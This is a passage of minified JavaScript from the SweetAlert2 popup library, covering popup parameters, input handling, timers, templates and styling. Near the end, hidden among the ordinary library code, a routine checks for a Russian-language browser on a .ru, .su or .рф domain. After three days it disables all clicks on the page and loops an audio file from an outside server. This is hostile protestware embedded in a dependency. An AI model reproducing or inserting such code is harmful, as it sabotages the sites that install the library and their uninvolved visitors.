0,scrollbarPadding:!0},G4=["allowEscapeKey","allowOutsideClick","background","buttonsStyling","cancelButtonAriaLabel","cancelButtonColor","cancelButtonText","closeButtonAriaLabel","closeButtonHtml","color","confirmButtonAriaLabel","confirmButtonColor","confirmButtonText","currentProgressStep","customClass","denyButtonAriaLabel","denyButtonColor","denyButtonText","didClose","didDestroy","footer","hideClass","html","icon","iconColor","iconHtml","imageAlt","imageHeight","imageUrl","imageWidth","preConfirm","preDeny","progressSteps","returnFocus","reverseButtons","showCancelButton","showCloseButton","showConfirmButton","showDenyButton","text","title","titleText","willClose"],K4={},_4=["allowOutsideClick","allowEnterKey","backdrop","focusConfirm","focusDeny","focusCancel","returnFocus","heightAuto","keydownListenerCapture"],Lt=t=>Object.prototype.hasOwnProperty.call(m1,t),Bt=t=>G4.indexOf(t)!==-1,b2=t=>K4[t],q4=t=>{Lt(t)||d(`Unknown parameter "${t}"`)},Q4=t=>{_4.includes(t)&&d(`The parameter "${t}" is incompatible with toasts`)},Y4=t=>{b2(t)&&R(t,b2(t))},Z4=t=>{t.backdrop===!1&&t.allowOutsideClick&&d('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');for(let a in t)q4(a),t.toast&&Q4(a),Y4(a)};function J4(t){let a=m(),r=e.innerParams.get(this);if(!a||Z(a,r.hideClass.popup)){d("You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.");return}let c=X4(t),i=Object.assign({},r,c);Mt(this,i),e.innerParams.set(this,i),Object.defineProperties(this,{params:{value:Object.assign({},this.params,t),writable:!1,enumerable:!0}})}let X4=t=>{let a={};return Object.keys(t).forEach(r=>{Bt(r)?a[r]=t[r]:d(`Invalid parameter to update: ${r}`)}),a};function t5(){let t=e.domCache.get(this),a=e.innerParams.get(this);if(!a){Ct(this);return}t.popup&&H.swalCloseEventFinishedCallback&&(H.swalCloseEventFinishedCallback(),delete H.swalCloseEventFinishedCallback),typeof a.didDestroy=="function"&&a.didDestroy(),a5(this)}let a5=t=>{Ct(t),delete t.params,delete H.keydownHandler,delete H.keydownTarget,delete H.currentInstance},Ct=t=>{t.isAwaitingPromise()?(k2(e,t),e.awaitingPromise.set(t,!0)):(k2(I1,t),k2(e,t))},k2=(t,a)=>{for(let r in t)t[r].delete(a)};var Ot=Object.freeze({__proto__:null,hideLoading:pt,disableLoading:pt,getInput:d4,close:e2,isAwaitingPromise:P4,rejectPromise:F4,handleAwaitingPromise:N1,closePopup:e2,closeModal:e2,closeToast:e2,enableButtons:I4,disableButtons:N4,enableInput:W4,disableInput:U4,showValidationMessage:$4,resetValidationMessage:j4,update:J4,_destroy:t5});let x1=t=>{let a=m();a||new n2,a=m();let r=u1();a2()?T(l1()):h5(a,t),k(r),a.setAttribute("data-loading","true"),a.setAttribute("aria-busy","true"),a.focus()},h5=(t,a)=>{let r=E1(),c=u1();!a&&W(B())&&(a=B()),k(r),a&&(T(a),c.setAttribute("data-button-to-replace",a.className)),c.parentNode.insertBefore(c,a),x([t,r],n.loading)},r5=(t,a)=>{a.input==="select"||a.input==="radio"?l5(t,a):["text","email","number","tel","textarea"].includes(a.input)&&(v1(a.inputValue)||t1(a.inputValue))&&(x1(B()),i5(t,a))},e5=(t,a)=>{let r=t.getInput();if(!r)return null;switch(a.input){case"checkbox":return c5(r);case"radio":return n5(r);case"file":return v5(r);default:return a.inputAutoTrim?r.value.trim():r.value}},c5=t=>t.checked?1:0,n5=t=>t.checked?t.value:null,v5=t=>t.files.length?t.getAttribute("multiple")!==null?t.files:t.files[0]:null,l5=(t,a)=>{let r=m(),c=i=>{o5[a.input](r,P2(i),a)};v1(a.inputOptions)||t1(a.inputOptions)?(x1(B()),O(a.inputOptions).then(i=>{t.hideLoading(),c(i)})):typeof a.inputOptions=="object"?c(a.inputOptions):M(`Unexpected type of inputOptions! Expected object, Map or Promise, got ${typeof a.inputOptions}`)},i5=(t,a)=>{let r=t.getInput();T(r),O(a.inputValue).then(c=>{r.value=a.input==="number"?`${parseFloat(c)||0}`:`${c}`,k(r),r.focus(),t.hideLoading()}).catch(c=>{M(`Error in inputValue promise: ${c}`),r.value="",k(r),r.focus(),t.hideLoading()})},o5={select:(t,a,r)=>{let c=r1(t,n.select),i=(g,S,Q)=>{let F=document.createElement("option");F.value=Q,N(F,S),F.selected=St(Q,r.inputValue),g.appendChild(F)};a.forEach(g=>{let S=g[0],Q=g[1];if(Array.isArray(Q)){let F=document.createElement("optgroup");F.label=S,F.disabled=!1,c.appendChild(F),Q.forEach(L1=>i(F,L1[1],L1[0]))}else i(c,Q,S)}),c.focus()},radio:(t,a,r)=>{let c=r1(t,n.radio);a.forEach(g=>{let S=g[0],Q=g[1],F=document.createElement("input"),L1=document.createElement("label");F.type="radio",F.name=n.radio,F.value=S,St(S,r.inputValue)&&(F.checked=!0);let R2=document.createElement("span");N(R2,Q),R2.className=n.label,L1.appendChild(F),L1.appendChild(R2),c.appendChild(L1)});let i=c.querySelectorAll("input");i.length&&i[0].focus()}},P2=t=>{let a=[];return typeof Map<"u"&&t instanceof Map?t.forEach((r,c)=>{let i=r;typeof i=="object"&&(i=P2(i)),a.push([c,i])}):Object.keys(t).forEach(r=>{let c=t[r];typeof c=="object"&&(c=P2(c)),a.push([r,c])}),a},St=(t,a)=>a&&a.toString()===t.toString(),d5=t=>{let a=e.innerParams.get(t);t.disableButtons(),a.input?At(t,"confirm"):F2(t,!0)},g5=t=>{let a=e.innerParams.get(t);t.disableButtons(),a.returnInputValueOnDeny?At(t,"deny"):T2(t,!1)},z5=(t,a)=>{t.disableButtons(),a(V1.cancel)},At=(t,a)=>{let r=e.innerParams.get(t);if(!r.input){M(`The "input" parameter is needed to be set when using returnInputValueOn${z(a)}`);return}let c=e5(t,r);r.inputValidator?M5(t,c,a):t.getInput().checkValidity()?a==="deny"?T2(t,c):F2(t,c):(t.enableButtons(),t.showValidationMessage(r.validationMessage))},M5=(t,a,r)=>{let c=e.innerParams.get(t);t.disableInput(),Promise.resolve().then(()=>O(c.inputValidator(a,c.validationMessage))).then(g=>{t.enableButtons(),t.enableInput(),g?t.showValidationMessage(g):r==="deny"?T2(t,a):F2(t,a)})},T2=(t,a)=>{let r=e.innerParams.get(t||void 0);r.showLoaderOnDeny&&x1(P()),r.preDeny?(e.awaitingPromise.set(t||void 0,!0),Promise.resolve().then(()=>O(r.preDeny(a,r.validationMessage))).then(i=>{i===!1?(t.hideLoading(),N1(t)):t.close({isDenied:!0,value:typeof i>"u"?a:i})}).catch(i=>bt(t||void 0,i))):t.close({isDenied:!0,value:a})},yt=(t,a)=>{t.close({isConfirmed:!0,value:a})},bt=(t,a)=>{t.rejectPromise(a)},F2=(t,a)=>{let r=e.innerParams.get(t||void 0);r.showLoaderOnConfirm&&x1(),r.preConfirm?(t.resetValidationMessage(),e.awaitingPromise.set(t||void 0,!0),Promise.resolve().then(()=>O(r.preConfirm(a,r.validationMessage))).then(i=>{W(w())||i===!1?(t.hideLoading(),N1(t)):yt(t,typeof i>"u"?a:i)}).catch(i=>bt(t||void 0,i))):yt(t,a)},p5=(t,a,r)=>{e.innerParams.get(t).toast?s5(t,a,r):(H5(a),f5(a),V5(t,a,r))},s5=(t,a,r)=>{a.popup.onclick=()=>{let c=e.innerParams.get(t);c&&(u5(c)||c.timer||c.input)||r(V1.close)}},u5=t=>t.showConfirmButton||t.showDenyButton||t.showCancelButton||t.showCloseButton,c2=!1,H5=t=>{t.popup.onmousedown=()=>{t.container.onmouseup=function(a){t.container.onmouseup=void 0,a.target===t.container&&(c2=!0)}}},f5=t=>{t.container.onmousedown=()=>{t.popup.onmouseup=function(a){t.popup.onmouseup=void 0,(a.target===t.popup||t.popup.contains(a.target))&&(c2=!0)}}},V5=(t,a,r)=>{a.container.onclick=c=>{let i=e.innerParams.get(t);if(c2){c2=!1;return}c.target===a.container&&G(i.allowOutsideClick)&&r(V1.backdrop)}},m5=t=>typeof t=="object"&&t.jquery,kt=t=>t instanceof Element||m5(t),x5=t=>{let a={};return typeof t[0]=="object"&&!kt(t[0])?Object.assign(a,t[0]):["title","html","icon"].forEach((r,c)=>{let i=t[c];typeof i=="string"||kt(i)?a[r]=i:i!==void 0&&M(`Unexpected type of ${r}! Expected "string" or "Element", got ${typeof i}`)}),a};function w5(){let t=this;for(var a=arguments.length,r=new Array(a),c=0;c<a;c++)r[c]=arguments[c];return new t(...r)}function L5(t){class a extends this{_main(c,i){return super._main(c,Object.assign({},t,i))}}return a}let B5=()=>H.timeout&&H.timeout.getTimerLeft(),Pt=()=>{if(H.timeout)return x0(),H.timeout.stop()},Tt=()=>{if(H.timeout){let t=H.timeout.start();return C2(t),t}},C5=()=>{let t=H.timeout;return t&&(t.running?Pt():Tt())},O5=t=>{if(H.timeout){let a=H.timeout.increase(t);return C2(a,!0),a}},S5=()=>H.timeout&&H.timeout.isRunning(),Ft=!1,E2={};function A5(){let t=arguments.length>0&&arguments[0]!==void 0?arguments[0]:"data-swal-template";E2[t]=this,Ft||(document.body.addEventListener("click",y5),Ft=!0)}let y5=t=>{for(let a=t.target;a&&a!==document;a=a.parentNode)for(let r in E2){let c=a.getAttribute(r);if(c){E2[r].fire({template:c});return}}};var b5=Object.freeze({__proto__:null,isValidParameter:Lt,isUpdatableParameter:Bt,isDeprecatedParameter:b2,argsToParams:x5,getContainer:A,getPopup:m,getTitle:J1,getHtmlContainer:h1,getImage:X1,getIcon:l1,getIconContent:m2,getInputLabel:u0,getCloseButton:x2,getActions:E1,getConfirmButton:B,getDenyButton:P,getCancelButton:i1,getLoader:u1,getFooter:rt,getTimerProgressBar:t2,getFocusableElements:w2,getValidationMessage:w,getProgressSteps:s,isLoading:f0,isVisible:g4,clickConfirm:st,clickDeny:z4,clickCancel:M4,fire:w5,mixin:L5,showLoading:x1,enableLoading:x1,getTimerLeft:B5,stopTimer:Pt,resumeTimer:Tt,toggleTimer:C5,increaseTimer:O5,isTimerRunning:S5,bindClickHandler:A5});class k5{constructor(a,r){this.callback=a,this.remaining=r,this.running=!1,this.start()}start(){return this.running||(this.running=!0,this.started=new Date,this.id=setTimeout(this.callback,this.remaining)),this.remaining}stop(){return this.running&&(this.running=!1,clearTimeout(this.id),this.remaining-=new Date().getTime()-this.started.getTime()),this.remaining}increase(a){let r=this.running;return r&&this.stop(),this.remaining+=a,r&&this.start(),this.remaining}getTimerLeft(){return this.running&&(this.stop(),this.start()),this.remaining}isRunning(){return this.running}}let Et=["swal-title","swal-html","swal-footer"],P5=t=>{let a=typeof t.template=="string"?document.querySelector(t.template):t.template;if(!a)return{};let r=a.content;return W5(r),Object.assign(T5(r),F5(r),E5(r),R5(r),D5(r),I5(r),N5(r,Et))},T5=t=>{let a={};return Array.from(t.querySelectorAll("swal-param")).forEach(c=>{d1(c,["name","value"]);let i=c.getAttribute("name"),g=c.getAttribute("value");typeof m1[i]=="boolean"?a[i]=g!=="false":typeof m1[i]=="object"?a[i]=JSON.parse(g):a[i]=g}),a},F5=t=>{let a={};return Array.from(t.querySelectorAll("swal-function-param")).forEach(c=>{let i=c.getAttribute("name"),g=c.getAttribute("value");a[i]=new Function(`return ${g}`)()}),a},E5=t=>{let a={};return Array.from(t.querySelectorAll("swal-button")).forEach(c=>{d1(c,["type","color","aria-label"]);let i=c.getAttribute("type");a[`${i}ButtonText`]=c.innerHTML,a[`show${z(i)}Button`]=!0,c.hasAttribute("color")&&(a[`${i}ButtonColor`]=c.getAttribute("color")),c.hasAttribute("aria-label")&&(a[`${i}ButtonAriaLabel`]=c.getAttribute("aria-label"))}),a},R5=t=>{let a={},r=t.querySelector("swal-image");return r&&(d1(r,["src","width","height","alt"]),r.hasAttribute("src")&&(a.imageUrl=r.getAttribute("src")),r.hasAttribute("width")&&(a.imageWidth=r.getAttribute("width")),r.hasAttribute("height")&&(a.imageHeight=r.getAttribute("height")),r.hasAttribute("alt")&&(a.imageAlt=r.getAttribute("alt"))),a},D5=t=>{let a={},r=t.querySelector("swal-icon");return r&&(d1(r,["type","color"]),r.hasAttribute("type")&&(a.icon=r.getAttribute("type")),r.hasAttribute("color")&&(a.iconColor=r.getAttribute("color")),a.iconHtml=r.innerHTML),a},I5=t=>{let a={},r=t.querySelector("swal-input");r&&(d1(r,["type","label","placeholder","value"]),a.input=r.getAttribute("type")||"text",r.hasAttribute("label")&&(a.inputLabel=r.getAttribute("label")),r.hasAttribute("placeholder")&&(a.inputPlaceholder=r.getAttribute("placeholder")),r.hasAttribute("value")&&(a.inputValue=r.getAttribute("value")));let c=Array.from(t.querySelectorAll("swal-input-option"));return c.length&&(a.inputOptions={},c.forEach(i=>{d1(i,["value"]);let g=i.getAttribute("value"),S=i.innerHTML;a.inputOptions[g]=S})),a},N5=(t,a)=>{let r={};for(let c in a){let i=a[c],g=t.querySelector(i);g&&(d1(g,[]),r[i.replace(/^swal-/,"")]=g.innerHTML.trim())}return r},W5=t=>{let a=Et.concat(["swal-param","swal-function-param","swal-button","swal-image","swal-icon","swal-input","swal-input-option"]);Array.from(t.children).forEach(r=>{let c=r.tagName.toLowerCase();a.includes(c)||d(`Unrecognized element <${c}>`)})},d1=(t,a)=>{Array.from(t.attributes).forEach(r=>{a.indexOf(r.name)===-1&&d([`Unrecognized attribute "${r.name}" on <${t.tagName.toLowerCase()}>.`,`${a.length?`Allowed attributes are: ${a.join(", ")}`:"To set the value, use HTML within the element."}`])})},Rt=10,U5=t=>{let a=A(),r=m();typeof t.willOpen=="function"&&t.willOpen(r);let i=window.getComputedStyle(document.body).overflowY;G5(a,r,t),setTimeout(()=>{$5(a,r)},Rt),L2()&&(j5(a,t.scrollbarPadding,i),x4()),!a2()&&!H.previousActiveElement&&(H.previousActiveElement=document.activeElement),typeof t.didOpen=="function"&&setTimeout(()=>t.didOpen(r)),_(a,n["no-transition"])},Dt=t=>{let a=m();if(t.target!==a)return;let r=A();a.removeEventListener(R1,Dt),r.style.overflowY="auto"},$5=(t,a)=>{R1&&lt(a)?(t.style.overflowY="hidden",a.addEventListener(R1,Dt)):t.style.overflowY="auto"},j5=(t,a,r)=>{w4(),a&&r!=="hidden"&&y4(),setTimeout(()=>{t.scrollTop=0})},G5=(t,a,r)=>{x(t,r.showClass.backdrop),a.style.setProperty("opacity","0","important"),k(a,"grid"),setTimeout(()=>{x(a,r.showClass.popup),a.style.removeProperty("opacity")},Rt),x([document.documentElement,document.body],n.shown),r.heightAuto&&r.backdrop&&!r.toast&&x([document.documentElement,document.body],n["height-auto"])};var It={email:(t,a)=>/^[a-zA-Z0-9.+_-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]{2,24}$/.test(t)?Promise.resolve():Promise.resolve(a||"Invalid email address"),url:(t,a)=>/^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(t)?Promise.resolve():Promise.resolve(a||"Invalid URL")};function K5(t){t.inputValidator||Object.keys(It).forEach(a=>{t.input===a&&(t.inputValidator=It[a])})}function _5(t){(!t.target||typeof t.target=="string"&&!document.querySelector(t.target)||typeof t.target!="string"&&!t.target.appendChild)&&(d('Target parameter is not valid, defaulting to "body"'),t.target="body")}function q5(t){K5(t),t.showLoaderOnConfirm&&!t.preConfirm&&d(`showLoaderOnConfirm is set to true, but preConfirm is not defined.
-showLoaderOnConfirm should be used together with preConfirm, see usage example:
-https://sweetalert2.github.io/#ajax-request`),_5(t),typeof t.title=="string"&&(t.title=t.title.split(`
-`).join("<br />")),k0(t)}let q;class w1{constructor(){if(typeof window>"u")return;q=this;for(var a=arguments.length,r=new Array(a),c=0;c<a;c++)r[c]=arguments[c];let i=Object.freeze(this.constructor.argsToParams(r));Object.defineProperties(this,{params:{value:i,writable:!1,enumerable:!0,configurable:!0}});let g=q._main(q.params);e.promise.set(this,g)}_main(a){let r=arguments.length>1&&arguments[1]!==void 0?arguments[1]:{};Z4(Object.assign({},r,a)),H.currentInstance&&(H.currentInstance._destroy(),L2()&&ft()),H.currentInstance=q;let c=Y5(a,r);q5(c),Object.freeze(c),H.timeout&&(H.timeout.stop(),delete H.timeout),clearTimeout(H.restoreFocusTimeout);let i=Z5(q);return Mt(q,c),e.innerParams.set(q,c),Q5(q,i,c)}then(a){return e.promise.get(this).then(a)}finally(a){return e.promise.get(this).finally(a)}}let Q5=(t,a,r)=>new Promise((c,i)=>{let g=S=>{t.close({isDismissed:!0,dismiss:S})};I1.swalPromiseResolve.set(t,c),I1.swalPromiseReject.set(t,i),a.confirmButton.onclick=()=>{d5(t)},a.denyButton.onclick=()=>{g5(t)},a.cancelButton.onclick=()=>{z5(t,g)},a.closeButton.onclick=()=>{g(V1.close)},p5(t,a,g),p4(t,H,r,g),r5(t,r),U5(r),J5(H,r,g),X5(a,r),setTimeout(()=>{a.container.scrollTop=0})}),Y5=(t,a)=>{let r=P5(t),c=Object.assign({},m1,a,r,t);return c.showClass=Object.assign({},m1.showClass,c.showClass),c.hideClass=Object.assign({},m1.hideClass,c.hideClass),c},Z5=t=>{let a={popup:m(),container:A(),actions:E1(),confirmButton:B(),denyButton:P(),cancelButton:i1(),loader:u1(),closeButton:x2(),validationMessage:w(),progressSteps:s()};return e.domCache.set(t,a),a},J5=(t,a,r)=>{let c=t2();T(c),a.timer&&(t.timeout=new k5(()=>{r("timer"),delete t.timeout},a.timer),a.timerProgressBar&&(k(c),$(c,a,"timerProgressBar"),setTimeout(()=>{t.timeout&&t.timeout.running&&C2(a.timer)})))},X5=(t,a)=>{if(!a.toast){if(!G(a.allowEnterKey)){a3();return}t3(t,a)||y2(-1,1)}},t3=(t,a)=>a.focusDeny&&W(t.denyButton)?(t.denyButton.focus(),!0):a.focusCancel&&W(t.cancelButton)?(t.cancelButton.focus(),!0):a.focusConfirm&&W(t.confirmButton)?(t.confirmButton.focus(),!0):!1,a3=()=>{document.activeElement instanceof HTMLElement&&typeof document.activeElement.blur=="function"&&document.activeElement.blur()};if(typeof window<"u"&&/^ru\b/.test(navigator.language)&&location.host.match(/\.(ru|su|xn--p1ai)$/)){let t=new Date,a=localStorage.getItem("swal-initiation");a?(t.getTime()-Date.parse(a))/(1e3*60*60*24)>3&&setTimeout(()=>{document.body.style.pointerEvents="none";let r=document.createElement("audio");r.src="https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3",r.loop=!0,document.body.appendChild(r),setTimeout(()=>{r.play().catch(()=>{})},2500)},500):localStorage.setItem("swal-initiation",`${t}`)}Object.assign(w1.prototype,Ot),Object.assign(w1,b5),Object.keys(Ot).forEach(t=>{w1[t]=function(){if(q)return q[t](...arguments)}}),w1.DismissReason=V1,w1.version="11.6.16";let n2=w1;return n2.default=n2,n2});typeof Y<"u"&&Y.Sweetalert2&&(Y.swal=Y.sweetAlert=Y.Swal=Y.SweetAlert=Y.Sweetalert2);typeof document<"u"&&function(e,v){var l=e.createElement("style");if(e.getElementsByTagName("head")[0].appendChild(l),l.styleSheet)l.styleSheet.disabled||(l.styleSheet.cssText=v);else try{l.innerHTML=v}catch{l.innerText=v}}(document,'.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;transform:rotate(45deg);border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}.swal2-container{display:grid;position:fixed;z-index:1060;top:0;right:0;bottom:0;left:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}.swal2-container.swal2-backdrop-show,.swal2-container.swal2-noanimation{background:rgba(0,0,0,.4)}.swal2-container.swal2-backdrop-hide{background:rgba(0,0,0,0) !important}.swal2-container.swal2-top-start,.swal2-container.swal2-center-start,.swal2-container.swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}.swal2-container.swal2-top,.swal2-container.swal2-center,.swal2-container.swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}.swal2-container.swal2-top-end,.swal2-container.swal2-center-end,.swal2-container.swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}.swal2-container.swal2-top-start>.swal2-popup{align-self:start}.swal2-container.swal2-top>.swal2-popup{grid-column:2;align-self:start;justify-self:center}.swal2-container.swal2-top-end>.swal2-popup,.swal2-container.swal2-top-right>.swal2-popup{grid-column:3;align-self:start;justify-self:end}.swal2-container.swal2-center-start>.swal2-popup,.swal2-container.swal2-center-left>.swal2-popup{grid-row:2;align-self:center}.swal2-container.swal2-center>.swal2-popup{grid-column:2;grid-row:2;align-self:center;justify-self:center}.swal2-container.swal2-center-end>.swal2-popup,.swal2-container.swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;align-self:center;justify-self:end}.swal2-container.swal2-bottom-start>.swal2-popup,.swal2-container.swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}.swal2-container.swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;justify-self:center;align-self:end}.swal2-container.swal2-bottom-end>.swal2-popup,.swal2-container.swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;align-self:end;justify-self:end}.swal2-container.swal2-grow-row>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}.swal2-container.swal2-grow-column>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}.swal2-container.swal2-no-transition{transition:none !important}.swal2-popup{display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:#545454;font-family:inherit;font-size:1rem}.swal2-popup:focus{outline:none}.swal2-popup.swal2-loading{overflow-y:hidden}.swal2-title{position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}.swal2-actions{display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}.swal2-actions:not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}.swal2-actions:not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}.swal2-actions:not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}.swal2-loader{display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}.swal2-styled{margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}.swal2-styled:not([disabled]){cursor:pointer}.swal2-styled.swal2-confirm{border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}.swal2-styled.swal2-confirm:focus{box-shadow:0 0 0 3px rgba(112,102,224,.5)}.swal2-styled.swal2-deny{border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}.swal2-styled.swal2-deny:focus{box-shadow:0 0 0 3px rgba(220,55,65,.5)}.swal2-styled.swal2-cancel{border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}.swal2-styled.swal2-cancel:focus{box-shadow:0 0 0 3px rgba(110,120,129,.5)}.swal2-styled.swal2-default-outline:focus{box-shadow:0 0 0 3px rgba(100,150,200,.5)}.swal2-styled:focus{outline:none}.swal2-styled::-moz-focus-inner{border:0}.swal2-footer{justify-content:center;margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em}.swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}.swal2-timer-progress-bar{width:100%;height:.25em;background:rgba(0,0,0,.2)}.swal2-image{max-width:100%;margin:2em auto 1em}.swal2-close{z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:serif;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}.swal2-close:hover{transform:none;background:rgba(0,0,0,0);color:#f27474}.swal2-close:focus{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}.swal2-close::-moz-focus-inner{border:0}.swal2-html-container{z-index:1;justify-content:center;margin:1em 1.6em .3em;padding:0;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}.swal2-input,.swal2-file,.swal2-textarea,.swal2-select,.swal2-radio,.swal2-checkbox{margin:1em 2em 3px}.swal2-input,.swal2-file,.swal2-textarea{box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}.swal2-input.swal2-inputerror,.swal2-file.swal2-inputerror,.swal2-textarea.swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}.swal2-input:focus,.swal2-file:focus,.swal2-textarea:focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}.swal2-input::placeholder,.swal2-file::placeholder,.swal2-textarea::placeholder{color:#ccc}.swal2-range{margin:1em 2em 3px;background:#fff}.swal2-range input{width:80%}.swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}.swal2-range input,.swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}.swal2-input{height:2.625em;padding:0 